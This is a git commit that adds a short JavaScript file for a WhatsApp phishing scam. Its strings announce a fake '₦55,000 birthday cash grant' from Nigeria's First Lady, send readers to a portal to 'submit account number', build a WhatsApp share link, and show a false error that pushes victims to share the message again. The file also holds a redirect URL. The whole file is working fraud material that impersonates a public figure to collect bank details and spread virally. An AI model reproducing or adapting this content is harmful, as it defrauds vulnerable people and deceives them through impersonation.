c082ef2e3ba1abbad1f5e8ec5532bac451bf378a
itidnewblog1 <newblog1itid@gmail.com>
2025-09-23 23:09:26 +0100

    Create google-pc.js

---
+++ google-pc.js
@@ -0,0 +1,10 @@
+
+          var text1 ="*First Lady N20 Billion Birthday Cash Grant*%0A%0AFirst Lady, Senator Oluremi Tinubu, is giving out ₦55,000 cash grant to Nigerians in celebration of her 65th birthday.%0A%0A _All Nigerian youths are entitled to this grant_%0A%0A *Go to portal*👇%0A https://rhward.org/55kgrant.html%0A%0A*Submit Account Number Here*👇%0A https://rhward.org/55kgrant %0A%0AN.B: SHARE WITH OTHER NIGERIANS YOUTHS LET THEM ALL BENEFIT FROM THIS *20 BILLION BIRTHDAY GRANT*",
+        
+            text2 = " an amount of ",
+            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
+            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+            abcde = "http://outrotomr.com/4/3144603",
+            saved = "",
+            share = "whatsapp://send?text=" + text1;
+  
